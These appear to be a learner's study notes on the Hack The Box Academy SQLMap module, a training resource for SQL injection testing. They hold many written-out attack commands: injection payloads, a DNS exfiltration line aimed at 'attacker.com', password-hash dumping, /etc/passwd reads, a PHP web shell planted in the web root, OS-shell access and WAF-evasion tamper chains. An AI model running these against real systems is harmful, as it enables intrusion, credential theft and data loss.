# SQLMap Essentials

**Platform:** Hack The Box Academy  
**Module:** SQLMap Essentials  
**Sections:** 11  
**Difficulty:** Easy  
**Category:** Offensive Security / Web Application Penetration Testing  
**Goal:** Penetration Tester role in India | Target: January 2027

---

## Table of Contents

1. [Overview](#overview)
2. [SQLMap Installation and Help](#sqlmap-installation-and-help)
3. [Supported SQL Injection Types](#supported-sql-injection-types)
4. [Getting Started — Basic Usage](#getting-started--basic-usage)
5. [SQLMap Output Interpretation](#sqlmap-output-interpretation)
6. [Building Requests for SQLMap](#building-requests-for-sqlmap)
   - [GET Parameters](#get-parameters)
   - [POST Data](#post-data)
   - [Full HTTP Request File](#full-http-request-file)
   - [Custom Headers and Cookies](#custom-headers-and-cookies)
7. [Handling SQLMap Errors](#handling-sqlmap-errors)
8. [Attack Tuning](#attack-tuning)
   - [Prefix and Suffix](#prefix-and-suffix)
   - [Level and Risk](#level-and-risk)
   - [Advanced Tuning Options](#advanced-tuning-options)
9. [Database Enumeration](#database-enumeration)
10. [Advanced Enumeration](#advanced-enumeration)
11. [Bypassing WAF and Anti-CSRF Protection](#bypassing-waf-and-anti-csrf-protection)
    - [Anti-CSRF Token Bypass](#anti-csrf-token-bypass)
    - [Unique Value Bypass](#unique-value-bypass)
    - [IP Blacklisting Bypass](#ip-blacklisting-bypass)
    - [WAF Bypass with Tamper Scripts](#waf-bypass-with-tamper-scripts)
12. [OS Exploitation via SQLMap](#os-exploitation-via-sqlmap)
    - [Reading Files](#reading-files)
    - [Writing Files and Web Shell](#writing-files-and-web-shell)
    - [OS Shell](#os-shell)
13. [Key Tools Reference](#key-tools-reference)
14. [MITRE ATT&CK Mapping](#mitre-attck-mapping)

---

## Overview

SQLMap is a free, open-source penetration testing tool written in Python that automates detection and exploitation of SQL injection vulnerabilities. First released in 2006 and actively maintained today, it is the most comprehensive SQLi tool available — supporting more database management systems and injection types than any other tool in its class.

SQLMap is not a blunt instrument. Its architecture combines a powerful detection engine with a vast library of payloads, tamper scripts for WAF bypass, and post-exploitation modules for file system access and OS command execution — all configurable with fine-grained switches.

### Supported Databases (35+)

MySQL, Oracle, PostgreSQL, Microsoft SQL Server, SQLite, IBM DB2, Microsoft Access, Firebird, Sybase, SAP MaxDB, Informix, MariaDB, HSQLDB, CockroachDB, TiDB, MemSQL, H2, MonetDB, Apache Derby, Amazon Redshift, Vertica, Mckoi, Presto, Altibase, MimerSQL, CrateDB, Greenplum, Drizzle, Apache Ignite, Cubrid, InterSystems Cache, IRIS, eXtremeDB, FrontBase

### Core Capability Areas

| Area | Description |
|------|-------------|
| Target connection | URL, request files, Burp logs, Google dorks, bulk files |
| Injection detection | 6 SQLi technique types, heuristics, DBMS fingerprinting |
| Enumeration | Databases, tables, columns, users, privileges, password hashes |
| Exploitation | File read/write, OS shell, UDF-based command execution |
| WAF bypass | Tamper scripts, random agents, chunked encoding, delay injection |
| Optimisation | Threading, session resumption, batch mode, partial output |

---

## SQLMap Installation and Help

```bash
# Pre-installed on PwnBox and most security-focused Linux distributions
# Install on Debian/Ubuntu
Hackerpatel007_1@htb[/htb]$ sudo apt install sqlmap

# Clone latest development version manually
Hackerpatel007_1@htb[/htb]$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
Hackerpatel007_1@htb[/htb]$ python sqlmap.py

# Basic help — most commonly needed options
Hackerpatel007_1@htb[/htb]$ sqlmap -h

# Advanced help — all options and switches
Hackerpatel007_1@htb[/htb]$ sqlmap -hh
```

**Verbosity levels (`-v`):**

| Level | Output |
|-------|--------|
| 0 | Show only Python tracebacks, error/critical messages |
| 1 | Show info and warning messages (default) |
| 2 | Show debug messages |
| 3 | Show injected payloads |
| 4 | Show HTTP requests |
| 5 | Show HTTP response headers |
| 6 | Show HTTP response body (full) |

> **Tip:** Use `-v 3` during troubleshooting to see every payload being sent. Use `-v 6` to see full HTTP request/response cycles — equivalent to Burp's history view.

---

## Supported SQL Injection Types

SQLMap detects and exploits all six known SQLi technique types, controlled via `--technique=BEUSTQ`:

| Code | Type | Example Payload | Speed | When Used |
|------|------|----------------|-------|-----------|
| **B** | Boolean-based blind | `AND 1=1` | Slow (~7-8 req/char) | Most common; works when no DB output is shown |
| **E** | Error-based | `AND GTID_SUBSET(@@version,0)` | Fast (200 byte chunks) | When DB errors appear in page output |
| **U** | UNION query-based | `UNION ALL SELECT 1,@@version,3` | Fastest (entire table/request) | When query results are displayed in page |
| **S** | Stacked queries | `; DROP TABLE users` | Varies | When multiple statements allowed (MSSQL/PostgreSQL) |
| **T** | Time-based blind | `AND 1=IF(2>1,SLEEP(5),0)` | Slowest | When no output and no errors — last resort |
| **Q** | Inline queries | `SELECT (SELECT @@version) from` | Rare | Specific application structure required |

**Out-of-band (DNS exfiltration):**

```sql
-- DNS exfiltration — results sent via DNS subdomains to attacker-controlled domain
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

Used when all other types are unavailable or too slow. Requires controlling a DNS server for the attacker domain.

> **Key concept:** UNION-based is always the preferred technique when visible output exists — it retrieves entire tables in a single request. Time-based blind is the last resort, requiring one SLEEP per bit of data extracted.

---

## Getting Started — Basic Usage

### Simplest Possible Run

```bash
# Test a GET parameter — --batch auto-accepts all default prompts
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

SQLMap performs these steps automatically:
1. Tests connection to the target URL
2. Checks content stability (consistent responses to identical requests)
3. Tests if the parameter is dynamic (value changes affect response)
4. Runs heuristic injection tests to identify DBMS
5. Runs full injection tests for all 6 SQLi types
6. Reports all confirmed vulnerable parameters with payload details

### SQLMap Detected Injection Points Output

```
sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 8814=8814

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 7744 FROM(SELECT COUNT(*),CONCAT(0x7170706a71,(SELECT (ELT(7744=7744,1))),0x71707a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 3669 FROM (SELECT(SLEEP(5)))TIxJ)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(...)-- -
---
back-end DBMS: MySQL >= 5.0
```

SQLMap found 4 injection types on the same parameter — it will use the most efficient one (UNION) for all subsequent data extraction.

---

## SQLMap Output Interpretation

Understanding SQLMap's log messages is critical for diagnosing issues and understanding what is happening during a scan.

| Log Message | Meaning |
|-------------|----------|
| `target URL content is stable` | Identical requests return consistent responses — good baseline for injection detection |
| `GET parameter 'id' appears to be dynamic` | Parameter value changes affect response — likely linked to database |
| `heuristic (basic) test shows that GET parameter 'id' might be injectable` | Intentionally invalid value caused a DBMS error — strong injection indicator |
| `heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to XSS attacks` | Secondary XSS heuristic fired — not SQLMap's primary purpose but useful to note |
| `it looks like the back-end DBMS is 'MySQL'` | DBMS fingerprinted — SQLMap will now focus payloads on MySQL-specific injection |
| `reflective value(s) found and filtering out` | Payload appears in response — SQLMap filtering this noise automatically |
| `GET parameter 'id' appears to be 'AND boolean-based blind' injectable (with --string="luther")` | Confirmed injectable using string `luther` as TRUE/FALSE differentiator |
| `time-based comparison requires a larger statistical model, please wait` | SQLMap building baseline timing model — normal for time-based blind |
| `automatically extending ranges for UNION query injection technique tests` | At least one technique found — SQLMap investing more requests in UNION detection |
| `ORDER BY technique appears to be usable` | Binary search for column count is available — speeds up UNION detection |
| `GET parameter 'id' is vulnerable` | Confirmed injectable — most important message in a scan |
| `sqlmap identified the following injection point(s)` | Final summary of all confirmed injection types and their payloads |
| `fetched data logged to text files under '/home/user/.sqlmap/output/'` | All results saved to disk for later reference |

---

## Building Requests for SQLMap

### GET Parameters

```bash
# Simple GET parameter
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/vuln.php?id=1" --batch

# Multiple GET parameters — SQLMap tests all of them
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/vuln.php?id=1&cat=2" --batch

# Test only a specific parameter with -p
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/vuln.php?id=1&cat=2" -p id --batch
```

---

### POST Data

```bash
# POST parameters via --data
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/login.php" \
  --data="username=admin&password=admin" --batch

# JSON POST body
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/api/item" \
  --data='{"id":1}' \
  -H "Content-Type: application/json" --batch
```

---

### Full HTTP Request File

The most reliable approach — capture the exact request from Burp Suite or browser DevTools and feed it directly to SQLMap. This guarantees correct headers, cookies, and body format.

**Capture request in Burp → right-click → Save item → `req.txt`**

```
POST /action.php HTTP/1.1
Host: 10.129.43.173:32150
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 8
Origin: http://10.129.43.173:32150
Connection: keep-alive
Referer: http://10.129.43.173:32150/shop.html

{"id":1}
```

```bash
# Feed request file to SQLMap with -r
Hackerpatel007_1@htb[/htb]$ sqlmap -r req.txt --batch

# Mark a specific injection point with an asterisk in the file
# e.g., replace {"id":1} with {"id":"1*"} in req.txt — SQLMap only tests that position
Hackerpatel007_1@htb[/htb]$ sqlmap -r req.txt --batch
```

> **Why use `-r`:** It eliminates encoding issues, preserves exact headers and cookies, handles complex JSON/XML bodies automatically, and ensures SQLMap sends requests that match what the real browser sends — reducing false negatives from request format mismatches.

---

### Custom Headers and Cookies

```bash
# Add a custom header (e.g., authentication token)
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/" \
  -H "X-Auth-Token: abc123" --batch

# Provide a session cookie manually
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/profile.php?id=1" \
  --cookie="PHPSESSID=abc123def456" --batch

# Test a cookie value for injection
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/" \
  --cookie="id=1" -p id --batch

# Use a random User-Agent to evade basic WAF/bot detection
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" \
  --random-agent --batch
```

---

## Handling SQLMap Errors

When a scan is not behaving as expected, these flags help diagnose and resolve issues:

```bash
# --parse-errors — display raw DBMS error messages in the console
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --parse-errors --batch
```

```
[16:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation:
1064 You have an error in your SQL syntax...'
```

```bash
# -t — save all HTTP traffic (requests AND responses) to a file for manual inspection
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/vuln.php?id=1" \
  --batch -t /tmp/traffic.txt

Hackerpatel007_1@htb[/htb]$ cat /tmp/traffic.txt
```

```bash
# -v 6 — maximum verbosity; prints full HTTP request and response in real-time
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/vuln.php?id=1" -v 6 --batch
```

```bash
# --proxy — route all SQLMap traffic through Burp Suite for visual inspection
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" \
  --proxy="http://127.0.0.1:8080" --batch
```

**Common error scenarios and fixes:**

| Symptom | Cause | Fix |
|---------|-------|-----|
| No injection found on known-vulnerable target | Injection point inside JSON/XML body | Use `-r req.txt` with correct Content-Type header |
| All requests return same response | Parameter is static / not linked to DB | Try other parameters; use `--level=5` to expand tests |
| Scan too slow | Time-based blind on high-latency connection | Use `--technique=BEU` to skip time-based; increase `--time-sec` |
| 403 / WAF blocking | User-Agent or payload signature detected | Add `--random-agent`, use tamper scripts |
| False positives in boolean-based | Unstable target response | Use `--string="known_string"` or `--code=200` to anchor detection |

---

## Attack Tuning

### Prefix and Suffix

Used when the injection point is inside a complex query structure that SQLMap cannot auto-detect:

```bash
# Target PHP code: WHERE id LIKE (('INPUT')) LIMIT 0,1
# Requires custom prefix and suffix to escape the nested structure
Hackerpatel007_1@htb[/htb]$ sqlmap -u "www.example.com/?q=test" \
  --prefix="%'))" --suffix="-- -" --batch
```

Resulting injected query:
```sql
SELECT id,name FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

---

### Level and Risk

```bash
# Default: --level=1 --risk=1 → 72 payloads per parameter
# Maximum: --level=5 --risk=3 → 7,865 payloads per parameter

# Increase both for heavily protected or stubborn targets
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" \
  --level=5 --risk=3 --batch
```

| Option | Range | Effect |
|--------|-------|--------|
| `--level` | 1-5 (default 1) | Increases boundary set (prefix/suffix pairs) — more context variations tested |
| `--risk` | 1-3 (default 1) | Increases payload risk — adds OR-based and UPDATE/DELETE payloads |

> **Warning:** `--risk=3` adds OR-based payloads which can trigger UPDATE/DELETE operations on the database if the vulnerable statement modifies data. Only use on targets where data loss is acceptable, or after confirming the injection is in a SELECT context.

---

### Advanced Tuning Options

| Option | Purpose | Example |
|--------|---------|----------|
| `--code=200` | Anchor TRUE detection to specific HTTP status code | WAF returns 403 on FALSE responses |
| `--titles` | Compare responses by HTML `<title>` tag content | Title changes between TRUE/FALSE |
| `--string="success"` | Anchor TRUE detection on specific string in response | Eliminates false positives |
| `--text-only` | Strip all HTML tags — compare visible text only | Heavy JavaScript apps with dynamic content |
| `--technique=BEU` | Restrict to specific SQLi techniques | Skip slow time-based on fast targets |
| `--union-cols=17` | Manually specify UNION column count | When ORDER BY detection fails |
| `--union-char='a'` | Replace NULL placeholder in UNION with a specific value | NULL incompatible with query result types |
| `--union-from=users` | Specify FROM table for UNION payload | Required for some Oracle injections |
| `--dns-domain=attacker.com` | Enable DNS exfiltration channel | When all output channels are blocked |
| `--second-url=URL` | Second URL where results are displayed | Stored SQL injection — submit here, results at second URL |

---

## Database Enumeration

All enumeration flags work automatically once a vulnerable parameter is confirmed:

```bash
# Banner — DBMS version string
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --banner --batch

# Current database user and hostname
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --current-user --current-db --batch

# Check if current user has DBA privileges
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --is-dba --batch

# List all databases
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dbs --batch

# List all tables in a specific database
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" -D testdb --tables --batch

# List all columns in a specific table
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" -D testdb -T users --columns --batch

# Dump all data from a specific table
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" -D testdb -T users --dump --batch

# Dump entire database (all tables)
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" -D testdb --dump --batch

# Dump all databases (everything)
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump-all --batch
```

> **Optimisation tip:** Always specify `-D database -T table` when dumping — `--dump-all` downloads everything including system tables and generates enormous output. Target only the tables that matter.

---

## Advanced Enumeration

```bash
# Enumerate all database users and password hashes
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --users --passwords --batch

# Enumerate user roles and privileges
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --roles --privileges --batch

# Dump specific columns only (faster, targeted)
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" \
  -D testdb -T users -C username,password --dump --batch

# Retrieve only the first 10 rows
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" \
  -D testdb -T users --dump --start=1 --stop=10 --batch

# Search for a table name across all databases
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" \
  --search -T user --batch

# Search for a column name across all databases and tables
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" \
  --search -C password --batch

# Automatic hash cracking (SQLMap uses dictionary attack on dumped hashes)
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" \
  -D testdb -T users --dump --batch
# SQLMap auto-prompts to crack found hashes using built-in wordlist
```

**Schema search — one of SQLMap's most powerful hidden features:**

```bash
# --search -T searches all databases for table names matching the keyword
# --search -C searches all databases and tables for column names matching the keyword
# Useful when you don't know the database structure but know what data you're looking for
```

---

## Bypassing WAF and Anti-CSRF Protection

### Anti-CSRF Token Bypass

Modern applications use CSRF tokens — unique values per request embedded in forms. SQLMap handles them automatically:

```bash
# --csrf-token — tell SQLMap the name of the CSRF token parameter
# SQLMap will automatically re-fetch the page and extract the token for each request
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/login.php" \
  --data="username=admin&password=admin&csrf_token=abc123" \
  --csrf-token="csrf_token" --batch
```

---

### Unique Value Bypass

Some parameters require unique values per request (e.g., random nonces):

```bash
# --randomize — tell SQLMap to randomize a specific parameter value per request
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&rp=8921" \
  --randomize=rp --batch
```

---

### IP Blacklisting Bypass

```bash
# Rotate through X-Forwarded-For addresses to bypass IP-based rate limiting
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" \
  --headers="X-Forwarded-For: 127.0.0.1" --batch
```

---

### WAF Bypass with Tamper Scripts

Tamper scripts modify payloads in-flight to bypass WAF signature detection. They are Python scripts stored in `sqlmap/tamper/`:

```bash
# List all available tamper scripts
Hackerpatel007_1@htb[/htb]$ ls /usr/share/sqlmap/tamper/

# Apply a single tamper script
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" \
  --tamper=between --batch

# Chain multiple tamper scripts
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" \
  --tamper=between,randomcase,space2comment --batch
```

**Most useful tamper scripts:**

| Tamper Script | What It Does | WAF Signature Bypassed |
|---------------|-------------|------------------------|
| `between` | Replaces `>` with `NOT BETWEEN 0 AND` and `=` with `BETWEEN x AND x` | Comparison operator blocking |
| `randomcase` | Randomly changes character case (`SeLeCt`, `WhErE`) | Case-sensitive keyword matching |
| `space2comment` | Replaces spaces with `/**/` | Space-based payload detection |
| `space2dash` | Replaces spaces with `--` + random string | Space-based payload detection |
| `charencode` | URL-encodes all characters | Payload character blacklisting |
| `chardoubleencode` | Double URL-encodes all characters | Layered WAF decoding |
| `unmagicquotes` | Replaces single quotes with multi-byte sequences | Magic quotes / addslashes bypass |
| `base64encode` | Base64-encodes entire payload | Blacklist bypass for raw SQL keywords |
| `equaltolike` | Replaces `=` with `LIKE` | Equality operator blocking |
| `greatest` | Replaces `>` with `GREATEST()` | Greater-than operator blocking |
| `ifnull2ifisnull` | Replaces `IFNULL` with `IF(ISNULL(...))` | Function name blacklisting |
| `modsecurityversioned` | Wraps queries in versioned MySQL comments | ModSecurity rule bypass |

> **Combining tamper scripts:** Chain them with commas — SQLMap applies them in order from left to right. For aggressive WAFs, combine `between,randomcase,space2comment` as a starting point.

---

## OS Exploitation via SQLMap

### Reading Files

Requires `FILE` privilege on the database user.

```bash
# Read any file the MySQL OS user has access to
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" \
  --file-read "/etc/passwd" --batch
```

```
[*] starting @ 16:54:31
[16:54:31] [INFO] fetching file: '/etc/passwd'
do you want confirmation that the remote file '/etc/passwd' has been successfully downloaded? [Y/n] Y
[16:54:48] [INFO] the local file '/home/user/.sqlmap/output/www.example.com/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (982 B)
```

```bash
# Read the file locally
Hackerpatel007_1@htb[/htb]$ cat /home/user/.sqlmap/output/www.example.com/files/_etc_passwd
root:x:0:0:root:/root:/bin/bash
...
```

---

### Writing Files and Web Shell

Requires `FILE` privilege and `secure_file_priv` not restricting the target path.

```bash
# Step 1 — prepare the web shell locally
Hackerpatel007_1@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Step 2 — write it to the web root
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" \
  --file-write "shell.php" \
  --file-dest "/var/www/html/shell.php" --batch
```

```
[17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)
```

```bash
# Step 3 — execute OS commands via the web shell
Hackerpatel007_1@htb[/htb]$ curl http://www.example.com/shell.php?cmd=ls+-la
```

---

### OS Shell

SQLMap's `--os-shell` provides an interactive shell without manually writing a web shell. It uses UDF injection (User Defined Functions) on MySQL or file write + stager on other DBMS types:

```bash
# Attempt OS shell — SQLMap picks the technique automatically
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell --batch

# If UNION technique fails — specify error-based for better output
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" \
  --os-shell --technique=E --batch
```

```
os-shell> ls -la
command standard output:
---
total 156
drwxrwxrwt 1 www-data www-data   4096 Nov 19 18:06 .
drwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 ..
-rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php
...
```

> **Note:** SQLMap first asks for the web language (PHP/ASP/ASPX/JSP) and the web root directory. Pass `--batch` to accept defaults (PHP + common locations). If the auto-detected web root is wrong, select option 2 and provide the correct path from your earlier enumeration.

---

## Key Tools Reference

| Command | Purpose |
|---------|----------|
| `sqlmap -u "URL?id=1" --batch` | Basic GET parameter scan |
| `sqlmap -u "URL" --data="id=1" --batch` | POST parameter scan |
| `sqlmap -r req.txt --batch` | Scan from saved HTTP request file |
| `sqlmap -u "URL?id=1" -p id --batch` | Test only a specific parameter |
| `sqlmap -u "URL?id=1" --cookie="PHPSESSID=abc" --batch` | Include session cookie |
| `sqlmap -u "URL?id=1" --random-agent --batch` | Use random User-Agent |
| `sqlmap -u "URL?id=1" --proxy="http://127.0.0.1:8080" --batch` | Route through Burp/ZAP |
| `sqlmap -u "URL?id=1" --parse-errors --batch` | Show raw DBMS errors |
| `sqlmap -u "URL?id=1" -t /tmp/traffic.txt --batch` | Save all traffic to file |
| `sqlmap -u "URL?id=1" -v 6 --batch` | Maximum verbosity output |
| `sqlmap -u "URL?id=1" --level=5 --risk=3 --batch` | Maximum payload coverage |
| `sqlmap -u "URL?id=1" --technique=BEU --batch` | Restrict to Boolean, Error, UNION only |
| `sqlmap -u "URL?id=1" --tamper=between,randomcase --batch` | Chain tamper scripts for WAF bypass |
| `sqlmap -u "URL?id=1" --csrf-token="token" --batch` | Handle anti-CSRF tokens automatically |
| `sqlmap -u "URL?id=1" --banner --batch` | Get DBMS version banner |
| `sqlmap -u "URL?id=1" --current-user --current-db --is-dba --batch` | DB user info and DBA check |
| `sqlmap -u "URL?id=1" --dbs --batch` | List all databases |
| `sqlmap -u "URL?id=1" -D db --tables --batch` | List tables in a database |
| `sqlmap -u "URL?id=1" -D db -T table --columns --batch` | List columns in a table |
| `sqlmap -u "URL?id=1" -D db -T table --dump --batch` | Dump all data from a table |
| `sqlmap -u "URL?id=1" -D db -T table -C col1,col2 --dump --batch` | Dump specific columns only |
| `sqlmap -u "URL?id=1" --search -T users --batch` | Search for table name across all DBs |
| `sqlmap -u "URL?id=1" --search -C password --batch` | Search for column name across all DBs |
| `sqlmap -u "URL?id=1" --users --passwords --batch` | Dump all DB users and password hashes |
| `sqlmap -u "URL?id=1" --file-read "/etc/passwd" --batch` | Read a file from the server |
| `sqlmap -u "URL?id=1" --file-write shell.php --file-dest /var/www/html/shell.php --batch` | Write a file to the server |
| `sqlmap -u "URL?id=1" --os-shell --technique=E --batch` | Get interactive OS shell |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|-------------|
| T1190 | — | Exploit Public-Facing Application — automated SQLi detection and exploitation via SQLMap |
| T1078 | T1078.001 | Valid Accounts: Default Accounts — dumping and cracking DB user password hashes |
| T1005 | — | Data from Local System — `--dump` extracting tables, credentials, and sensitive data |
| T1083 | — | File and Directory Discovery — `--file-read` reading `/etc/passwd`, web configs, source code |
| T1552 | T1552.001 | Unsecured Credentials: Credentials in Files — reading PHP config files with DB credentials via LOAD_FILE |
| T1505 | T1505.003 | Server Software Component: Web Shell — `--file-write` deploying PHP web shell to web root |
| T1059 | T1059.004 | Command and Scripting Interpreter: Unix Shell — `--os-shell` executing OS commands via UDF or stager |
| T1572 | — | Protocol Tunneling — DNS exfiltration via out-of-band SQLi channel |
| T1027 | T1027.001 | Obfuscated Files or Information: Binary Padding — tamper scripts encoding/obfuscating payloads to bypass WAF |
| T1562 | T1562.001 | Impair Defences: Disable or Modify Tools — WAF bypass via tamper scripts and random User-Agent rotation |

---

*Module completed as part of the HTB Academy CPTS path.*  
*Penetration Tester role in India | Target: January 2027*
